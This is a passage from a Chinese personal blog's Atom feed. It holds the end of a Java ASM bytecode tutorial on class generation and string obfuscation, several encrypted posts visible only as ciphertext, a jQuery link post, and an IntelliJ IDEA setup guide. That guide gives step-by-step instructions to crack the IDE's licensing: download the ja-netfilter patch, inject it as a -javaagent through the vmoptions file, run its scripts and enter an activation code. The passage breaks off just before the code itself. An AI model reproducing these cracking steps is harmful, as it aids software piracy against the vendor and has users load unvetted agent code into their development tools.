class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.aBoolean = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">name</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象和数组"><a href="#创建对象和数组" class="headerlink" title="创建对象和数组"></a>创建对象和数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//常量</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">2</span>);<span class="comment">//数组长度</span></span><br><span class="line">methodVisitor.visitIntInsn(NEWARRAY,T_BYTE);<span class="comment">//类型是byte</span></span><br><span class="line">methodVisitor.visitInsn(DUP);<span class="comment">//压</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">0</span>);<span class="comment">//插入数组0位置</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">1</span>);</span><br><span class="line">methodVisitor.visitInsn(AASTORE);<span class="comment">//保存</span></span><br></pre></td></tr></table></figure><h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>就是在写入的时候做一个转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor1</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor1</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 拦截字符串修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor1</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor1</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(api,<span class="built_in">super</span>.visitMethod(access,name,desc,signature,exceptions)) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(Object cst)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cst <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = ((String) cst).getBytes(StandardCharsets.UTF_8);<span class="comment">//转换bytes</span></span><br><span class="line">                    mv.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">                    mv.visitInsn(DUP);</span><br><span class="line">                    mv.visitIntInsn(SIPUSH,bytes.length);</span><br><span class="line">                    mv.visitIntInsn(NEWARRAY,T_BYTE);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">                        mv.visitInsn(DUP);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,i);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,bytes[i]);</span><br><span class="line">                        mv.visitInsn(AASTORE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mv.visitLdcInsn(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    mv.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;([BLjava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">super</span>.visitLdcInsn(cst);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换成bytes</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Java安全" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>typora写博客文章</title>
    <link href="http://example.com/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/"/>
    <id>http://example.com/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-25T02:19:03.042Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bbc7b8d0866d7f5724d4aa02343efe9916966e0b70379b3f0718399bbbb1ea11">48e22157b1ef105701eba779d55791b9b7bf81dcf2fbe51e642c1382bdb61b5f0f01be820cf6d65475b36b9789b7c1d1eb29aed3d9317a7f7d68f50136b3148ad17d1e46d190d9a823f6798fdc522007c0180105963d5bc4091b8b926e4fd8539ca36ae4eb97fb7e84249d138ba7800047c8d19f04ce6184c94dbcecb60ab9ef1f5d4f6a029a2f9b0d2aefb32fd083f006790533441f868f7d6431e353c1abf07cf0c1ab211eccda1dc7a6c586339af60becda821ae2a2312150d6204ee5a7a35b8f8a278b2227d0ad77fe1f24e78412c88d30eec1452783dc8d41cf5fd49b7ee58986a447a274d42fd6bae60953be23cd48d0a5b3fbce1d8158a396374f904cc1ef2777377f36892ba418b3d465ee439cf86a81ff2f5745bd321fae00ec347c3cc82623da3b146a65b373e5de85f502b78ae5dbad4de7765416f090f6c188d50a4801585cc9d2af95b0e65beb55b0d0eaeccd6ebca739c148290ed39a3e32b65d48ca009eb40145e4df16ddf9c3909db694b220ce99b03b8196c13fc0bd3d552b0d263ab6549b045737b9d134aeef89f5ad6b30bbc9053653ea4a411d36eb9df42feb48390b34a3d533aadd5e97719652214da6fd57ec3fcd1255003445aa4bcb3c695947380e79d876151694bc756730efae51abbc1f85a8771a7b4614b5bfbcf2e32883c23702639f27d3c8d385df73dbbf4567be31df36b8d9da97ae3dfaf13e7c66b047b50cece88647ffc0d18a6576b55cbc5f9bcbc7087fbc4879dbc58dfe83b4595cb13bc2eb1d940e18014768b5f96be8c9e39c601f3a508be5336efcfe2ee00c64bce87948fc26e1c71343129c9ba50dc4b3f210097ad59d60acf893f68b6ec234bf4386e999c2864b5f0adce0ab3b451e0b407534820d1fb8ec7e432cec7aef3efb0d6652967f31a4f88de4e70ea14c5be2791a81a16b439d99699145083c73710c0b819cfe2889ce76fe68a0e4fe1209bb8ab8a9331e3b9984844db96911def164f6845a579e239c940ad7e4326914d06a02b13da42c4cc3418ee6be1b359c5f1e8d8ef62526314e879350e4622da54bc60065aa663181f393e051ffed1d58beaffcebd5fc1c504d17e71ac77b9ce639511669ca6f1ea5ae694180de496ac7c9dbe564c0e9c350d5f8e167cc0c2f6c4813b848aeca179ff9665c6ed1064cb5a52ac82312d5cde33b75737a8ae62818645deda65f8bae9bce307db0d10bb0f60881e38e1652a2dc52448c622c4858969700ddd9b337d6eb821f4a3d6a8a9f1fa4b6c8b51fdc7c4188a2a7ddb2993cdf85365ae67795ceb4ef3a285703ad7c8a2611eb9bddf9ff27e462533293c0ef8375d8ff42795d2c7c323342bee36549d4f4387672e24c94cf8a531aa0f3ffce6041761ec2b38816de447702bc2f02ffaaa91f11b3b06d962e815348ef9cad0ac6c49f57b989d9fc843fa9c15b1a8570c1f1cb6aa2932441de6fc87e8eeb5d48e5ba9ce4aee94517662813806039558b9e95f817ba7aaec58a4f28e1549f1696cd418b4d4573411697d00ea3f659fae905dbade8b123eb18a1303e89a2ca377e571ae1b3db5e13e20be19ac791efe2979e64477e82e262f25455f488840eace436b1cd62b6fa485d6c8e74bb3f5d80c954437c9a02c584c0e99bf558dc94854cac1deaab753b9852b1c53dbb40006c789240d1af0244a50bdbcc243767c1f3dc527e25910218135a70242afe302df72a55ecbdabe94277737330f94817a6a767b839e4ac53dd26e58d941e63f94ce66cebaf99586bca4438f5e9e3f3619a2165062b7e1d5bc9ad66b8d6b28460ed2b5fe2c628ab9554e6cbf5823c14f50faddf44e610a3072f9f8e6cd90036ec8f1b7974eb8116733fdfb37ea96a13b9d88479c68c8757a738b9243f6c71cd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">typora</summary>
    
    
    
    <category term="typora" scheme="http://example.com/categories/typora/"/>
    
    
    <category term="typora" scheme="http://example.com/tags/typora/"/>
    
  </entry>
  
  <entry>
    <title>jQuery基础</title>
    <link href="http://example.com/2022/10/24/jQuery%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2022/10/24/jQuery%E5%9F%BA%E7%A1%80/</id>
    <published>2022-10-24T08:54:59.000Z</published>
    <updated>2022-11-24T08:58:45.322Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><strong>课上jQuery讲解的代码：</strong></p><p><a href="https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E7%A0%94%E7%A9%B6/%E6%9F%90%E6%A0%A1%E4%BC%81%E5%90%88%E4%BD%9C%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E5%9F%B9%E8%AE%AD%E8%B5%84%E6%96%99/WEB%E4%B8%89%E4%BB%B6%E5%A5%97/JAVASCRIPT/javascript%20basic/BASIC">https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E7%A0%94%E7%A9%B6/%E6%9F%90%E6%A0%A1%E4%BC%81%E5%90%88%E4%BD%9C%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E5%9F%B9%E8%AE%AD%E8%B5%84%E6%96%99/WEB%E4%B8%89%E4%BB%B6%E5%A5%97/JAVASCRIPT/javascript%20basic/BASIC</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="前端" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="jQuery基础" scheme="http://example.com/tags/jQuery%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>PythonSec</title>
    <link href="http://example.com/2022/10/21/PythonSec/"/>
    <id>http://example.com/2022/10/21/PythonSec/</id>
    <published>2022-10-21T12:27:35.000Z</published>
    <updated>2022-11-23T08:31:37.198Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="535b1af5b8782c1a464280d191f0f27bb07605d7f5259e521244df3b6a608ef3">b3c9a99c0ccdca4a7128185684909d47be45d0719c2e3a0ca90370066c74e9863b24333f1e525c8e1bb2268ef9b7b46aa3b07067fbf1ef6e2e63030f6510823dea5ceda2b59996f3b00a070a4e36468698d5dc22fab8a7781cd1f1d268071adccef47d36c8c48fc29deb7e9233baf7a74fd7c1a7e26383df617d160d6620f838db98ae80c3d518f06c03f25222b89f4325cafa413082b2e9cf493e613296789d4d5b3de93dbcf34a3b2b699634d06a34802c74af590182b7696d5001558d36013d8ae655c764077fc819b8d0eefdaf865634822f4074191ad66698ee8020c8be7b52d703bfa591fbddb63ac0586269f7fc31addbff718cfe800f480733bac76f4ee70ed2ea0c334723af5c08efd06597cbe2631509dfde5008a89b4e2b03b0b0c6ef3b2c87ddf42fbc464bb9c9ab4208a2a6af91df7963990712e00dd2ca8b56c0a4411f973ee52c39c5f3db2842e2fb5421f819eab629c3abaf6b7b97dd08a980480e2b01a3e23fb590b9821733e82fd44d99aed657eda2378714d277dcaff18252767dbc040b96c9dffbaa571e2131cafd1ebefcf8c193f7d5fbf98ee7e4774302d1ad50de4ce48ee985e074b0c4577f23c5a8002dc9fa3400b62a80a86154578937625fe0056699404ce98db8d6ae517bf4937fd05c9dde7663c64581415dc5a6075b2ee1627cb2e75eb0042d4c415f22ec47781e11fb609147eb042feb06</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">attackthispage</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Python安全资料分享</summary>
    
    
    
    <category term="Python安全" scheme="http://example.com/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python安全" scheme="http://example.com/tags/Python%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaSec</title>
    <link href="http://example.com/2022/06/21/JavaSec/"/>
    <id>http://example.com/2022/06/21/JavaSec/</id>
    <published>2022-06-21T12:29:53.000Z</published>
    <updated>2022-11-24T06:51:28.043Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="84d2d0d54a9ef46711695e4b958193c8a53f3eb371079be4925376b3c7430d84">b3c9a99c0ccdca4a7128185684909d47be45d0719c2e3a0ca90370066c74e9863b24333f1e525c8e1bb2268ef9b7b46aa3b07067fbf1ef6e2e63030f6510823dea5ceda2b59996f3b00a070a4e36468698d5dc22fab8a7781cd1f1d268071adccef47d36c8c48fc29deb7e9233baf7a74fd7c1a7e26383df617d160d6620f838db98ae80c3d518f06c03f25222b89f4325cafa413082b2e9cf493e613296789d4d5b3de93dbcf34a3b2b699634d06a34802c74af590182b7696d5001558d36013d8ae655c764077fc819b8d0eefdaf8664c8cd2d4e9ca2995677f51ed8c36588345d147907f84922fc8f972f6c4c025103ab79e0c25701ab8e84852816416442bbd885069e6dfcbeddea48d06b871c88ab1e7daec617549ffb239f9bf0c36e8973f0d66deb2db15eb3fa96c0bed34f44debb779ab29424f9deda2d2356bb7f4bd414fbb2d098f1b7120a38fea9e6b3cdd165bf5b0e1118a1cce7f69652c902e6b6ea1483e825e57fb179fd8affba215c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java安全资料分享</summary>
    
    
    
    <category term="Java安全" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb项目开发</title>
    <link href="http://example.com/2022/05/25/JavaWeb%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/"/>
    <id>http://example.com/2022/05/25/JavaWeb%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/</id>
    <published>2022-05-25T09:52:40.000Z</published>
    <updated>2022-11-25T09:53:46.305Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="59f7495286499639effdb3168d90aae2ec9d9ef4eb29bcd4598166a4e57dbac3">b3c9a99c0ccdca4a7128185684909d47be45d0719c2e3a0ca90370066c74e9863b24333f1e525c8e1bb2268ef9b7b46aa3b07067fbf1ef6e2e63030f6510823dea5ceda2b59996f3b00a070a4e36468698d5dc22fab8a7781cd1f1d268071adccef47d36c8c48fc29deb7e9233baf7a74fd7c1a7e26383df617d160d6620f838db98ae80c3d518f06c03f25222b89f4325cafa413082b2e9cf493e613296789d4d5b3de93dbcf34a3b2b699634d06a34802c74af590182b7696d5001558d36013d8ae655c764077fc819b8d0eefdaf86587da2cece7d3620e4e66cec80fc0d0f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Java开发" scheme="http://example.com/categories/Java%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="JavaWeb项目" scheme="http://example.com/tags/JavaWeb%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>idea安装配置</title>
    <link href="http://example.com/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</id>
    <published>2022-05-16T09:14:52.000Z</published>
    <updated>2022-11-26T11:04:27.425Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IntelliJ-Idea安装配置"><a href="#IntelliJ-Idea安装配置" class="headerlink" title="IntelliJ Idea安装配置"></a>IntelliJ Idea安装配置</h1><h2 id="IntelliJ-IDEA-2022-02-03（不推荐屁事多）"><a href="#IntelliJ-IDEA-2022-02-03（不推荐屁事多）" class="headerlink" title="IntelliJ IDEA 2022.02.03（不推荐屁事多）"></a>IntelliJ IDEA 2022.02.03（不推荐屁事多）</h2><h3 id="安装包下载"><a href="#安装包下载" class="headerlink" title="安装包下载"></a>安装包下载</h3><ul><li><a href="https://www.jetbrains.com/idea/download/#section=windows">https://www.jetbrains.com/idea/download/#section=windows</a></li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/1.png" alt="image-1"></li><li>自己选定安装的路径，然后下一步下一步就OK，到这里<strong>注意一下</strong>就行，<strong>下面的也是一样</strong>：</li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/2.png" alt="image-2"></li></ul><h3 id="补丁下载："><a href="#补丁下载：" class="headerlink" title="补丁下载："></a>补丁下载：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/libin9iOak/ja-netfilter-all/archive/refs/heads/main.zip</span><br></pre></td></tr></table></figure><p>下载之后，我们这里将其拷贝到C盘根目录下，<code>C:\ja-netfilter</code>。</p><h4 id="引入补丁"><a href="#引入补丁" class="headerlink" title="引入补丁"></a>引入补丁</h4><p>进入自己的IDEA安装路径下的的bin目录，配置bin目录下的<strong>idea64.exe.vmoptions</strong>文件</p><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/3.png" alt="image-3"></p><p>添加以下内容至该文件末尾，记得保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 引用补丁，补丁不能包含中文路径，否则会失效</span><br><span class="line">-javaagent:C:/ja-netfilter/ja-netfilter.jar</span><br><span class="line"># 最新Idea 版本需要添加下面两行，否则会报 key valid</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/4.png" alt="image-4"></p><h3 id="运行补丁文件："><a href="#运行补丁文件：" class="headerlink" title="运行补丁文件："></a>运行补丁文件：</h3><ul><li><p><strong><em>WIndows选择第三个</em></strong></p></li><li><p><em>uistall.sh为mac、linux相关版本的卸载程序</em></p></li><li><em>uinstall-</em>.vbs为windows相关版本的卸载程序*</li></ul><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/5.png" alt="image-5"></p><h3 id="激活IDEA"><a href="#激活IDEA" class="headerlink" title="激活IDEA"></a>激活IDEA</h3><ul><li>打开IDEA，并输入下面的激活码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 